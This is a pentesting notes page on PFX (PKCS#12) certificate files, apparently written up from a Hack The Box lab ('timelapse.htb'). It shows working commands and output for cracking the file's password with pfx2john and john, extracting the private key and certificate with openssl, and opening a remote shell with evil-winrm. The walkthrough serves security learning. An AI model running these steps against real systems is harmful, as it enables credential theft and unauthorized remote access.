---
description: >-
  A Personal Information Exchange (PFX) file is a secure container that stores 
  private/public keys and certificates.
---

# PFX file

<figure><img src="../.gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

A .pfx file also known as PKCS#12 certificate or .p12 file format can contain certificates in different formats, including .cert, .crt, and .pem. It allows you to securely transfer the certificate and its private key from one computer to another.&#x20;

### Components

PFX files are made of several components

* Private keys&#x20;
* Public keys
* Certificates

### Opening .pfx file

It possible to crack password protected .pfx files with john.                                                                                       &#x20;

```bash
# Use pfxjohn to get hash
$ pfx2john /home/kali/Downloads/legacyy_dev_auth.pfx > winrm.pfx                                                                                                                                                     

# Crack the hash with john.
$ john winrm.pfx --wordlist=rockyou.txt                                                                                                                                                                              
Using default input encoding: UTF-8                                                                                                                                                                                    
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])                                                                                                                                   
Cost 1 (iteration count) is 2000 for all loaded hashes                                                                                                                                                                 
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes                                                                                                                      
Will run 8 OpenMP threads                                                                                                                                                                                              
Press 'q' or Ctrl-C to abort, almost any other key for status                                                                                                                                                          
thuglegacy       (legacyy_dev_auth.pfx)                                                                                                                                                                                
1g 0:00:00:15 DONE (2024-10-18 10:57) 0.06626g/s 214164p/s 214164c/s 214164C/s thumper199..thscndsp1                                                                                                                   
Use the "--show" option to display all of the cracked passwords reliably                                                                                                                                               
Session completed.  
```

Knowing the password it is then possible using openssl to extract the private key and save it as a new .key file. The command will for this is:

### Dumping private key

* Use PKCS#12 format  ([https://en.wikipedia.org/wiki/PKCS\_12](https://en.wikipedia.org/wiki/PKCS_12))
* Exclude certificates from output

```bash
# Extract private key
─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.pfx.key-enc                                                                                       
Enter Import Password:                                                                                     
Enter PEM pass phrase:                                                                                     
Verifying - Enter PEM pass phrase: 
```

After this we dump the certificate:

```bash
# Dump certificate
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out legacyy_dev_auth.crt
```

#### Using the key and certificate

Having cracked the .pfx file and extracted the private key and certificate one of the possibilities to use them is WinRm. Commonly used by WinRM is port 5986.&#x20;

* -c    certificate file
* -k    key file
* -S   enable SSL

{% hint style="info" %}
We enable SSL because port 5986 was open which is HTTPS. Port 5985 is HTTP.
{% endhint %}

Finally we connect using evil-winrm

```bash
evil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt

Evil-WinRM shell v3.6                                                                                                                                                                                                  
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                                                                                           
Warning: SSL enabled                                                                                                                                                                                                   
                                                                                                           
Info: Establishing connection to remote endpoint                                                                                                                                                                       
Enter PEM pass phrase:                       
*Evil-WinRM* PS C:\Users\
```





